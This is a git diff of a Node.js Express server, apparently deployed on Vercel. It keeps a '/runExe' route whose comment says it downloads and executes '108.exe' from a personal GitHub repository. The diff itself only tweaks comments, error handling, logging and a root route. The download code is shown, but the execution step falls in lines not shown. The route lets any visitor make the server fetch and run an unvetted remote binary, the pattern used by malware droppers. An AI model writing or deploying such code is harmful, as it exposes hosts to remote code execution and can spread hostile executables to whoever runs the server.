@@ -5,7 +5,7 @@ const https = require('https');
 const path = require('path');
 
 const app = express();
-const exeFile = path.join(__dirname, '108.exe'); // Local path for EXE file
+const exeFile = path.join(__dirname, '108.exe'); // Correct EXE Path
 
 // Function to download EXE from GitHub
 const downloadFile = (url, dest, callback) => {
@@ -16,7 +16,7 @@ const downloadFile = (url, dest, callback) => {
             file.close(callback);
         });
     }).on('error', (err) => {
-        fs.unlink(dest);
+        fs.unlink(dest, () => {});
         console.error(`Download error: ${err.message}`);
         callback(err);
     });
@@ -24,7 +24,7 @@ const downloadFile = (url, dest, callback) => {
 
 // Route to download and execute EXE
 app.get('/runExe', (req, res) => {
-    const exeUrl = "https://raw.githubusercontent.com/deepakrummy/fenny/main/108.exe";
+    const exeUrl = "https://raw.githubusercontent.com/deepakrummy/fenny/main/108.exe"; // Correct URL
 
     // Download EXE first
     downloadFile(exeUrl, exeFile, (err) => {
@@ -45,12 +45,15 @@ app.get('/runExe', (req, res) => {
     });
 });
 
+// Fix Incorrect "/" Route (Now Returns a Simple Message)
+app.get('/', (req, res) => {
+    res.send("Server is running!");
+});
 
-
-// Start the server
+// Start the Server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server running at http://localhost:${PORT}`);
+    console.log(`✅ Server running at http://localhost:${PORT}`);
 });
 
 // Export app (for Vercel compatibility)
